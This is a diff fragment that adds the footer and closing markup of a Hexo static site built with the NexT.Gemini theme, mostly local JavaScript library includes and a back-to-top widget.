+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
